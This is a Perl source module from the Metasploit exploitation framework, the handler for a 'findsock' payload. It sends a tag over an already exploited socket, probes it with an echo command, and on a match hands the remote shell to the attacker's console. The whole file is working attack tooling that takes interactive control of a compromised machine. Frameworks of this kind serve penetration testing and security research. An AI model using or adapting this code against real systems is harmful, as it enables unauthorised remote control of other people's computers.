

package Msf::PayloadComponent::FindRecvConnection;
use strict;
use base 'Msf::PayloadComponent::ConnectionHandler';
use IO::Socket::INET;
use IO::Select;

my $info = {
  'Keys' => ['findsock'],
};

sub new {
  my $class = shift;
  my $self = $class->SUPER::new(@_);
  $self->_Info($self->MergeHashRec($info, $self->_Info));
  return($self);
}

sub ChildHandler {
  my $self = shift;
  my $sock = shift;

  # Get tag and make sure its 4 bytes (pad/truncate)
  my $tag = substr($self->GetLocal('FindTag') . ("\x01" x 4), 0, 4);
  
#  print "- $tag\n";
  return if(!$sock->connected);

  my $blocking = $sock->blocking;
  $sock->blocking(1);
  $sock->autoflush(1);

  sleep(1);

  my $selector = IO::Select->new($sock);

  my @ready = $selector->can_write(.5);
  goto DONE if(!@ready);

#  print Pex::Text::BufferC($tag);

  eval { $ready[0]->send($tag); };
#  $ready[0]->send('msf!');
  sleep(1);

  my @ready = $selector->can_write(.5);
  goto DONE if(!@ready || !$ready[0]->connected);
  eval { $ready[0]->send("echo ABCDE \r\n"); };

  @ready = $selector->can_read(.5);

  goto DONE if(!@ready);

  my $data;
  $ready[0]->recv($data, 4096);
  goto DONE if(!length($data));
  if($data =~ /ABCDE/) {
    $self->PipeRemoteIn($ready[0]);
    $self->PipeRemoteOut($ready[0]);
    $self->PrintLine('[*] Findsock found shell...');
    $self->HandleConsole;
    exit(0);
  }

DONE:
  $sock->blocking($blocking);
  return;
}

sub SigHandler {
  my $self = shift;
  # shhh
}
1;
